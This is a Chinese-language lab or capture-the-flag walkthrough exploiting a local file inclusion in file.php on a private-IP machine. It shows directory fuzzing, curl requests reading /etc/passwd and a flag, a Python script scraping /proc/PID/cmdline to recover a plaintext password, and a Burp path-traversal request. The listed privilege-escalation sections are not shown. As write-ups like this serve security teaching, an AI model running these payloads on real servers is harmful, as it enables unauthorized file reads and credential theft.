<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="1.信息收集gobuster123456789101112131415161718☁  ~  gobuster dir -u http:&#x2F;&#x2F;192.168.43.201 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt  -x php,html,txt,zip&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;">
<meta property="og:type" content="article">
<meta property="og:title" content="zhaochoudecat">
<meta property="og:url" content="https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/index.html">
<meta property="og:site_name" content="zhaochoudecat">
<meta property="og:description" content="1.信息收集gobuster123456789101112131415161718☁  ~  gobuster dir -u http:&#x2F;&#x2F;192.168.43.201 -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt  -x php,html,txt,zip&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2026-01-19T07:46:10.183Z">
<meta property="article:modified_time" content="2026-01-20T08:44:43.250Z">
<meta property="article:author" content="zhaochoudecat">
<meta name="twitter:card" content="summary">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
    <!-- title -->
    <title>zhaochoudecat</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
<meta name="generator" content="Hexo 8.1.1"></head>

<body>
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about/">About</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a target="_blank" rel="noopener" href="https://github.com/zhaochoudecat">Projects</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2026/01/23/web09/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
        
        
        <li><a class="icon" href="/2026/01/19/QQGroup/113/113/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&text="><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&is_video=false&description="><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=&body=Check out this article: https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&title="><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://zhaochoudecat.github.io/2026/01/19/QQGroup/114/114/&name=&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">1.信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#gobuster"><span class="toc-number">1.1.</span> <span class="toc-text">gobuster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ffuf"><span class="toc-number">1.2.</span> <span class="toc-text">ffuf</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2-%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81"><span class="toc-number">2.</span> <span class="toc-text">2.获取用户密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#2-1%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">2.1.</span> <span class="toc-text">2.1方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%A8%A1%E5%9D%97%E8%AF%A6%E8%A7%A3"><span class="toc-number">2.1.1.</span> <span class="toc-text">关键模块详解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-2%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">2.2.</span> <span class="toc-text">2.2方法二</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#3-%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">3.提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo-l"><span class="toc-number">3.1.</span> <span class="toc-text">sudo -l</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">3.2.</span> <span class="toc-text">提权方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%99%E6%98%AF%E4%B8%80%E4%B8%AA%E5%85%B8%E5%9E%8B%E7%9A%84-A-B-C-%E9%80%BB%E8%BE%91%E7%BB%93%E6%9E%84%EF%BC%9A"><span class="toc-number">3.2.1.</span> <span class="toc-text">这是一个典型的 A &amp;&amp; B || C 逻辑结构：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%A3%E5%B8%B8%E6%83%85%E5%86%B5%EF%BC%88%E4%B8%8D%E5%8A%A0-%EF%BC%89%EF%BC%9A"><span class="toc-number">3.2.2.</span> <span class="toc-text">正常情况（不加 &gt;&amp;-）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E4%BA%86-%EF%BC%9A"><span class="toc-number">3.2.3.</span> <span class="toc-text">加了 &gt;&amp;-：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C"><span class="toc-number">3.2.4.</span> <span class="toc-text">执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">3.3.</span> <span class="toc-text">提权方法二</span></a></li></ol></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index width mx-auto px2 my4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">zhaochoudecat</span>
      </span>
      
    <div class="postdate">
        <time datetime="2026-01-19T07:46:10.183Z" itemprop="datePublished">2026-01-19</time>
    </div>


      

    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h1><h2 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  gobuster <span class="built_in">dir</span> -u http://192.168.43.201 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -x php,html,txt,zip</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.8</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.43.201</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.8</span><br><span class="line">[+] Extensions:              html,txt,zip,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 615]</span><br><span class="line">/file.php             (Status: 500) [Size: 0]</span><br></pre></td></tr></table></figure>

<h2 id="ffuf"><a href="#ffuf" class="headerlink" title="ffuf"></a>ffuf</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">☁  ~  ffuf -u http://192.168.43.201/file.php\?FUZZ\=/etc/passwd -w /usr/share/wordlists/dirb/common.txt -fs 0</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\       </span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\       </span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v2.1.0-dev</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://192.168.43.201/file.php?FUZZ=/etc/passwd</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 0</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">file                    [Status: 200, Size: 1394, Words: 13, Lines: 27, Duration: 37ms]</span></span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.doubao.com/thread/w2d78f4eb7cbde317">https://www.doubao.com/thread/w2d78f4eb7cbde317</a>  ffuf介绍</p>
<p>或者使用wfuzz </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -t 指定并发数（默认 10，可适当调高），-d 增加 0.1 秒延迟避免拦截 </span></span><br><span class="line">wfuzz -z file,/usr/share/wordlists/dirb/common.txt -hh 0 --hc 404,403 -t 20 -d 0.1 <span class="string">&quot;http://192.168.43.201/file.php?FUZZ=/etc/passwd&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>LFI (本地文件包含) 验证</strong>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.43.201/file.php\?file\=/etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line"><span class="built_in">sync</span>:x:4:65534:<span class="built_in">sync</span>:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">welcome:x:1000:1000:,,,:/home/welcome:/bin/bash</span><br></pre></td></tr></table></figure>
<p>发现<code>welcome</code>用户</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -l http://192.168.43.201/file.php\?file\=/home/welcome/user.txt</span><br><span class="line">flag&#123;user-210f652e7e3b7e7359e523ef04e96295&#125;</span><br></pre></td></tr></table></figure>

<h1 id="2-获取用户密码"><a href="#2-获取用户密码" class="headerlink" title="2.获取用户密码"></a>2.获取用户密码</h1><h2 id="2-1方法一"><a href="#2-1方法一" class="headerlink" title="2.1方法一"></a>2.1方法一</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入requests库，用于发送HTTP请求</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标URL：存在LFI漏洞的文件（注意这里是fi1e.php，可能是file.php的笔误）</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.43.201/file.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印当前操作的提示信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Brute-forcing /proc/PID/cmdline to find hidden processes...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 遍历PID范围：扫描前3000个进程ID（Linux系统中进程ID从1开始，系统服务通常在低PID范围）</span></span><br><span class="line"><span class="keyword">for</span> pid <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3001</span>):</span><br><span class="line"></span><br><span class="line">	<span class="comment"># 构造Linux /proc文件系统中，对应PID的进程命令行文件路径</span></span><br><span class="line">	<span class="comment"># /proc/PID/cmdline：存储对应PID进程的启动命令行参数</span></span><br><span class="line">	file_path = <span class="string">f&quot;/proc/<span class="subst">&#123;pid&#125;</span>/cmdline&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># 构造LFI漏洞的参数：通过&quot;file&quot;参数传入要包含的文件路径（利用目标的LFI漏洞）</span></span><br><span class="line">	params = &#123;<span class="string">&#x27;file&#x27;</span>: file_path&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		<span class="comment"># 发送GET请求：传入目标URL、参数，超时时间1秒（避免请求卡住）</span></span><br><span class="line">		r = requests.get(url, params=params, timeout=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 过滤条件1：只处理响应内容长度&gt;0的请求（排除空响应的无效进程）</span></span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(r.content) &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 处理/proc/PID/cmdline的特殊格式：该文件中进程参数用\x00（空字符）分隔</span></span><br><span class="line">		<span class="comment"># 把空字符替换为空格，再解码为UTF-8字符串（ignore忽略无法解码的字符）</span></span><br><span class="line">		cmd = r.content.replace(<span class="string">b&#x27;\x00&#x27;</span>, <span class="string">b&#x27; &#x27;</span>).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 定义“无用/常见系统进程”列表：过滤掉这些进程，只显示不常见的（可能是隐藏进程）</span></span><br><span class="line">		useless = [<span class="string">&quot;/sbin/init&quot;</span>, <span class="string">&quot;systemd&quot;</span>, <span class="string">&quot;kworker&quot;</span>, <span class="string">&quot;scsi&quot;</span>, <span class="string">&quot;usb&quot;</span>, <span class="string">&quot;xfs&quot;</span>, <span class="string">&quot;ext4&quot;</span>]</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 过滤条件2：如果进程命令行中不包含useless里的任何关键词</span></span><br><span class="line">		<span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(x <span class="keyword">in</span> cmd <span class="keyword">for</span> x <span class="keyword">in</span> useless):</span><br><span class="line"></span><br><span class="line">		<span class="comment"># 打印找到的“非常见进程”：PID + 进程命令行</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">f&quot;[PID <span class="subst">&#123;pid&#125;</span>] <span class="subst">&#123;cmd&#125;</span>&quot;</span>)</span><br><span class="line">	</span><br><span class="line">		<span class="comment"># 捕获请求过程中的异常（如超时、连接失败等），直接跳过（不中断循环）</span></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>


<blockquote>
<p>[!NOTE] 代码整体功能解释<br>这段代码是<strong>利用 LFI（本地文件包含）漏洞，扫描 Linux 服务器的隐藏进程</strong>，核心原理是：</p>
<ol>
<li>Linux 系统的<code>/proc</code>是一个虚拟文件系统，其中<code>/proc/[PID]/cmdline</code>文件会存储对应 PID 进程的<strong>启动命令行参数</strong>（比如进程是怎么启动的、带了什么参数）；</li>
<li>目标<code>fi1e.php</code>存在 LFI 漏洞（可通过<code>file</code>参数包含任意本地文件）；</li>
<li>代码通过遍历 PID（1 到 3000），构造<code>/proc/PID/cmdline</code>路径，利用 LFI 漏洞读取这些文件，过滤掉常见系统进程后，显示可能的<strong>隐藏 &#x2F; 恶意进程</strong>（比如攻击者植入的后门进程）。</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://www.doubao.com/thread/wc855adec2cf23385">https://www.doubao.com/thread/wc855adec2cf23385</a></p>
</blockquote>
<blockquote>
<p>[!Success] Title</p>
<h3 id="关键模块详解"><a href="#关键模块详解" class="headerlink" title="关键模块详解"></a>关键模块详解</h3><ol>
<li><strong><code>/proc/PID/cmdline</code>的作用</strong>：Linux 的<code>/proc</code>目录是 “进程信息虚拟目录”，每个运行的进程对应一个以 PID 命名的子目录，其中<code>cmdline</code>文件记录了进程的启动命令（比如<code>/usr/bin/nginx -c /etc/nginx/nginx.conf</code>）。</li>
<li><strong><code>replace(b&#39;\x00&#39;, b&#39; &#39;)</code>的原因</strong>：<code>/proc/PID/cmdline</code>中，进程的命令和参数是用 ** 空字符（<code>\x00</code>）** 分隔的（比如<code>/bin/bash\x00-c\x00echo hello</code>），直接显示会有乱码，所以替换为空格方便阅读。</li>
</ol>
</blockquote>
<p><strong>运行结果</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[*] Brute-forcing /proc/PID/cmdline to find hidden processes...</span><br><span class="line">[PID 328] /usr/sbin/cron -f </span><br><span class="line">[PID 330] service --user welcome --password 6WXqj9Vc2tdXQ3TN0z54 --host localhost --port 8080 infinity </span><br><span class="line">[PID 335] /usr/sbin/rsyslogd -n -iNONE </span><br><span class="line">[PID 343] /sbin/dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -<span class="built_in">df</span> /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3 </span><br><span class="line">[PID 345] /usr/sbin/rsyslogd -n -iNONE </span><br><span class="line">[PID 346] /usr/sbin/rsyslogd -n -iNONE </span><br><span class="line">[PID 347] /usr/sbin/rsyslogd -n -iNONE </span><br><span class="line">[PID 354] /sbin/agetty -o -p -- \u --noclear tty1 linux </span><br><span class="line">[PID 378] sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups </span><br><span class="line">[PID 421] /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal </span><br><span class="line">[PID 434] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 438] /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal </span><br><span class="line">[PID 500] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 583] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 586] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 591] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 596] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 644] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 647] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 652] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 653] /usr/sbin/apache2 -k start </span><br><span class="line">[PID 656] /usr/sbin/apache2 -k start </span><br></pre></td></tr></table></figure>

<p>user:<code>welcome</code>  pass: <code>6WXqj9Vc2tdXQ3TN0z54</code></p>
<h2 id="2-2方法二"><a href="#2-2方法二" class="headerlink" title="2.2方法二"></a>2.2方法二</h2><p>利用<code>burp</code> </p>
<p>![[Pasted image 20260120161339.png]]</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">GET /file.php?file=../../../../proc/§1§/cmdline HTTP/1.1</span><br><span class="line">Host: 192.168.43.201</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:147.0) Gecko/20100101 Firefox/147.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: metabase.DEVICE=4f1a458f-da94-4203-b012-2fda8e9ba776; _ga=GA1.1.653680607.1768373507; metabase.TIMEOUT=alive; metabase.SESSION=4cb61d11-f4cc-463c-89b2-97063ce5f03b</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">If-Modified-Since: Fri, 16 Jan 2026 23:50:00 GMT</span><br><span class="line">If-None-Match: <span class="string">&quot;267-64889ffd754bc-gzip&quot;</span></span><br><span class="line">Priority: u=0, i</span><br></pre></td></tr></table></figure>
<p><strong>payload</strong><br>![[Pasted image 20260120161645.png]]<br><strong>结果</strong>：<br>![[Pasted image 20260120161933.png]]</p>
